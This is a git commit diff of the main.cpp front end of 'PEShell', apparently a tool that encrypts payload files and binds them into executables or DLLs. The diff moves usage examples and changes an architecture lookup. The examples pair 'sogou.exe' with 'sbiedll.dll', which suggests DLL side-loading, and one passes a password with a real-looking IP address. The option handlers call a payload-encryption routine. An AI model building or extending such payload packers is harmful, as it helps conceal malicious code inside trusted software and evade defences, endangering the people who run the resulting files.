4b944e8685410e874533ca5e45dd66b7dee32dff
satadriver <satadriver@sina.com>
2023-04-16 11:18:55 +0800

    revision

--- PEShell/main.cpp
+++ PEShell/main.cpp
@@ -32,20 +32,22 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 #endif
 
 	int ret = 0;
-	printf("example:PeShell -be sogou.exe sbiedll.dll -c params.dat -o out.exe\r\n");
 
-	printf("example:PeShell -be sogou.exe sbiedll.dll -p jy20200729 47.116.51.29 -o out.exe\r\n");
-
-	printf("example:PeShell -bd sogou.exe sbiedll.dll -c params.dat -o out.dll\r\n");
-
-	printf("example:PeShell -ber sogou.exe sbiedll.dll -c params.dat -o out.exe\r\n");
-
-	printf("example:PeShell -e sogou.exe -c params.dat -o out.exe\r\n");
-
-	printf("example:PeShell -d sogou.exe -c params.dat -o out.dll\r\n");
 
 	if (argc < 3)
 	{
+		printf("example:PeShell -be sogou.exe sbiedll.dll -c params.dat -o out.exe\r\n");
+
+		printf("example:PeShell -be sogou.exe sbiedll.dll -p jy20200729 47.116.51.29 -o out.exe\r\n");
+
+		printf("example:PeShell -bd sogou.exe sbiedll.dll -c params.dat -o out.dll\r\n");
+
+		printf("example:PeShell -ber sogou.exe sbiedll.dll -c params.dat -o out.exe\r\n");
+
+		printf("example:PeShell -e sogou.exe -c params.dat -o out.exe\r\n");
+
+		printf("example:PeShell -d sogou.exe -c params.dat -o out.dll\r\n");
+
 		printf("param error\r\n");
 		getchar();
 		return -1;
@@ -72,7 +74,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 	{
 		if (lstrcmpiA(argv[i], "-be") == 0)
 		{
-			cpu_arch = PEParser::getMachine(argv[i + 1]);
+			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
 
 			type = 3;
 			for (int j = i + 1, k = 0; k < 2; j++, k++)
@@ -85,7 +87,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		}
 		else if (lstrcmpiA(argv[i], "-bd") == 0)
 		{
-			cpu_arch = PEParser::getMachine(argv[i + 1]);
+			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
 			type = 4;
 			for (int j = i + 1, k = 0; k < 2; j++, k++)
 			{
@@ -98,7 +100,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		}
 		else if (lstrcmpiA(argv[i], "-dh") == 0)
 		{
-			cpu_arch = PEParser::getMachine(argv[i + 1]);
+			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
 			type = 4;
 			Crypto::cryptPayloadFile(argv[i + 1], TEMPLATE_TEMPORARY_FILENAME);
 			lstrcpyA(filelist[paramscnt], TEMPLATE_TEMPORARY_FILENAME);
@@ -108,7 +110,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		}
 		else if (lstrcmpiA(argv[i], "-eh") == 0)
 		{
-			cpu_arch = PEParser::getMachine(argv[i + 1]);
+			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
 			type = 3;
 			Crypto::cryptPayloadFile(argv[i + 1], TEMPLATE_TEMPORARY_FILENAME);
 			lstrcpyA(filelist[paramscnt], TEMPLATE_TEMPORARY_FILENAME);
@@ -118,7 +120,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		}
 		else if (lstrcmpiA(argv[i], "-e") == 0)
 		{
-			cpu_arch = PEParser::getMachine(argv[i + 1]);
+			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
 			printf("argv[%i]:%s\r\n", i, argv[i + 1]);
 
 			type = 1;
@@ -129,7 +131,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		}
 		else if (lstrcmpiA(argv[i], "-d") == 0)
 		{
-			cpu_arch = PEParser::getMachine(argv[i + 1]);
+			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
 			type = 2;
 			lstrcpyA(filelist[0], argv[i + 1]);
 			paramscnt++;
